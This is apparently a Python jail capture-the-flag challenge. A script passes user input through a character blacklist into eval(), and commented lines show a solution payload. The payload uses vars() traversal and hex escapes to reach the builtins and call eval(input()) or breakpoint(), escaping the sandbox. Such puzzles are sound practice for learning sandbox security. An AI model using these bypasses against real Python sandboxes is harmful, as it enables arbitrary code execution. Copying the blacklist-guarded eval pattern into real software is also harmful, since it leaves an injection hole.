expr = input("Input syntax to get shell / bash:\n; ")
blacklist = list("lite")

if len(expr) > 50:
    print("TOO LONG!")
    exit()

for char in expr:
    for c in blacklist:
        if char == c:
            print(f"u cant use \"{char}\"")
            exit()
        # if len(expr) > 100:
        #     print("TOO LONG!")
        #     exit()
        # else:
        #     if char == c:
        #         print(f"u cant use \"{char}\"")
        #         exit()
eval(expr)

# payload
#[x for x in vars()]
# [x for x in vars()][6]
# vars(vars()[[x for x in vars()][6]])
# vars(vars()[[x for x in vars()][6]])['eval']
# vars(vars()[[x for x in vars()][6]])['input']
# vars(vars()[[x for x in vars()][6]])['eval'](vars(vars()[[x for x in vars()][6]])['input']())
# vars(vars()[[x for x \x69n vars()][6]])['\x65va\x6c'](vars(vars()[[x for x \x69n vars()][6]])['\x69npu\x74']())

# [y for y in vars(vars()[[x for x in vars()][6]])]
# vars(vars()[[x for x in vars()][6]])['breakpoint']()
# vars(vars()[[x for x in vars()][6]])['br\x65akpo\x69n\x74']()

# or

# vars(vars()[[x for x in vars()][6]])[[y for y in vars(vars()[[x for x in vars()][6]])][12]]()
# vars(vars()[[*vars()][6]])[[y for y in vars(vars()[[*vars()][6]])][12]]()
